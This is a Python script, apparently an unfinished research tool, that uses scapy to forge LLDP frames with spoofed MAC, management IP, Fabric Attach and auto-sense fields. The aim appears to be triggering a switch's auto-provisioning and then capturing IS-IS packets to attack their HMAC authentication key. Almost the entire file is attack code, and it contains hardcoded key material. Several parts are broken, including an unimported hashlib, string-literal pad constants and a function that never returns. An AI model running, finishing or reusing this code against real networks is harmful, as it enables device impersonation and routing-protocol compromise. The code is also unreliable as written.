__version__ = "0.1.0"

import os
import subprocess
import sys
import random
import socket
from scapy.all import *
from scapy.contrib.lldp import *
from scapy.contrib.isis import *
from hashlib import sha256
from hashlib import md5
import hmac

IFACE = "br-lan"
MY_MAC = get_if_hwaddr(IFACE)
OPAD = b"0x5c"
IPAD = b"0x36"
APAD = b"0x878FE1F3"
BLOCK_SIZE = 64 #B, in bytes, 64 for sha-256
HASH_LEN = 32 #L, in bytes, 32 for sha-256. L is the length of the hash, measured in octets rather than bits.
KEY="toto" 
# If auth.length = 17 then it's md5 ()
# If auth.length = 35 then it's sha-256 ()
# Type is always 10 (0a), then length, then hash function (03 for sha256, 54 (36) for md5)
# For type sha, keyid is coded on 2 bytes before the hash itself

#a=rdpcap("Wireshark_captures/sha-256-one-side-from-startup.pcapng")
#p_rcv = PacketList(a)[0]

#print(p_rcv.getlayer(LLDPDUChassisID).id) # Extract the MAC address from the Chassis ID field

# print("####################")
# lldp_layer = p[0].getlayer(LLDPDUChassisID)
# if lldp_layer:
#     print(lldp_layer.subtype)
#     print(lldp_layer.fields)
#     print(lldp_layer.id)
# print("####################")

# Derive the 5th byte of the target MAC address. Keep the MAC vendor and the last byte to 00.
def derive_mac(input: str) -> str:
    parts = input.split(":")
    parts[4] = f"{random.randint(0, 255):02x}"
    new_mac = ":".join(parts)
    return new_mac

# Derive the last byte of the target IP address.
# TODO : Ensure the random value is not the input value (low chance but...)
def derive_ip(input: bytes) -> bytes:
    parts = list(input)
    parts[3] = random.randint(1, 254)
    new_ip = bytes(parts)
    return new_ip

def derive_autosense(input: bytes) -> bytes:
    return input[:3] + os.urandom(6) + input[-8:]

# "Ko is always L octets long" so here Ko is alway HASH_LEN octets long. 
# Take K (the key as a string), returns Ko as hex to the correct size
def k_to_ko_hex(k: string) -> bytes:
    if len(k) > 32 :
        ko_hex = hashlib.sha256(k.encode()).digest().hex()
    elif (len(k) == 32):
        ko_hex = k.encode().hex()
    else:
        k_hex = k.encode().hex()
        ko_hex = k_hex.ljust(64, "0") # padd to 32 bytes = 64 hex chars
    assert len(ko_hex) == 64
    print(ko_hex)

def send_lldp(packet: Packet):
    src_mac = packet[0].getlayer(LLDPDUChassisID).id
    src_ip = packet[0].getlayer(LLDPDUManagementAddress).management_address
    src_fa = packet[0].getlayer(LLDPDUGenericOrganisationSpecific, 1)
    src_autosense = packet[0].getlayer(LLDPDUGenericOrganisationSpecific, 2)

    #packet[0].layers()
    #print("###############################")
    #packet.show()
    #print(lastlayer(packet[0]))
    #print(packet[0].lastlayer)
    #print(type(src_mac))
    #print(mac2str(src_mac))
    #print(src_mac)
    #print(socket.inet_ntoa(src_ip))
    #print(list(src_org))
    #print("FA show")
    #print(type(src_fa))
    #src_fa.show()
    #print(src_fa.data[:-10])
    #print("Autosense show")
    #src_autosense.show()
    #print("###############################")

    #packet[0].getlayer(LLDPDUManagementAddress).show()
    #print(packet[0].getlayer(LLDPDUChassisID).id)
    
    # Derive target MAC address' 5th byte.
    new_mac = derive_mac(src_mac)
    # Derive target IP address' 4th byte.
    new_ip = derive_ip(src_ip)
    # Derive target Fabric Attach payload with new MAC address
    new_fa = src_fa.data[:-10] + mac2str(new_mac) + bytearray(b'\x00\x00\x00\xc0')
    # Derive target Auto-sense payload with new systemid.
    new_autosense = derive_autosense(src_autosense.data)

    # print(new_mac)
    # print(mac2str(new_mac))
    # print(src_fa.data)
    # print(new_fa)
    #print(socket.inet_ntoa(new_ip))
    pkt_to_send=packet[0]
    pkt_to_send[Ether].src = new_mac
    pkt_to_send[LLDPDUChassisID].id = new_mac
    pkt_to_send[LLDPDUManagementAddress].management_address = new_ip

    # FA and auto-sense are both OrganisationSpecific fields by scapy. The only for now to differentiate them is the org_code used.
    # TODO : Check better way to loop and filter org_code.
    if pkt_to_send[LLDPDUGenericOrganisationSpecific:1].org_code == 1037 :
        pkt_to_send[LLDPDUGenericOrganisationSpecific:1].data = new_fa
    if pkt_to_send[LLDPDUGenericOrganisationSpecific:2].org_code == 14189670 :
        pkt_to_send[LLDPDUGenericOrganisationSpecific:2].data = new_autosense

    #pkt_to_send.show()
    # TODO : Check packet conformity before sending ?
    wrpcap(filename="Wireshark_captures/output.pcapng",pkt=pkt_to_send)
    #sendp(pkt_to_send, iface=IFACE, count=10, inter=1)

def abuse_isis(packet: Packet):
    auth = packet[0].getlayer(ISIS_AuthenticationTlv)
    if auth is not None:
        print(auth.type)
        print(auth.len)
        print(auth.authtype)
        print(auth.password)
    # Step 1 : Get ISIS PDU
    isis_pdu = packet.getlayer(ISIS_CommonHdr)
    isis_pdu.show()
    # Step 2 : Remove ISIS authentifcation data. Assume sha2 only for now. Assume no padding for now.
    #isis_pdu_trunc, pad = packet.extract_padding(isis_pdu)
    #isis_pdu_trunc.show()
    #isis_pdu_trunc = isis_pdu[]


def main():
    # Start ISIS sniffer first in async mode, then start LLDP, so ISIS sniffer is already listening when LLDP triggers auto-sense.
    # Filter on ISIS Header and exclude your own MAC as source so you don't stop when you sniff your own packet.
    isis_sniffer = AsyncSniffer(offline="Wireshark_captures/sha-256-toto.pcapng", lfilter=lambda p: p.haslayer(ISIS_CommonHdr) and p.src != MY_MAC, count=1)
    #print(type(isis_sniffer))
    isis_sniffer.start()

    # Start LLDP sniffer, filter on LLDP, stop asa you receive one
    lldp_sniffer = AsyncSniffer(offline="Wireshark_captures/sha-256-one-side-from-startup.pcapng", filter="ether proto 0x88cc", count=1)
    lldp_sniffer.start()
    lldp_sniffer.join(timeout=10) # If none is received during 10s, assume error
    send_lldp(lldp_sniffer.results[0])
    
    # Assume here for now that the LLDP packet is sent, and the target switch has answered. Proceed with ISIS key abuse.
    isis_sniffer.join(timeout=10) # If none is received during 10s, assume error
    isis_pkt = isis_sniffer.results[0]
    #isis_pkt.show()
    #abuse_isis(isis_pkt)
    k_to_ko_hex("tototototototototototototototototo")


if __name__ == "__main__":
    main()